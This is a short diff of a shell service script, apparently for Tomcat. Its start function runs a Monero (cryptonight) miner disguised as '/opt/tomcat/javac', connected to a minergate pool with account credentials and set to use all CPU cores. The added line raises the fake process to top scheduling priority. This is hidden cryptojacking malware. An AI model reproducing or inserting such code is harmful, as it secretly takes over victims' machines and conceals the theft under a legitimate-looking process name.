@@ -18,6 +18,7 @@ do_stop () {
 }
 do_start () {
                 /opt/tomcat/javac -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -ustryng@gmail.com -pSlackware -t`lscpu|grep CPU\(s\)\:|grep -v NUMA|awk -F" " '{print $2 }'` &
+                ps -ef|grep javac|grep -v grep|awk -F" "  '{print $2}'|xargs renice -n -20 -p
 }
 case "$1" in
   start)
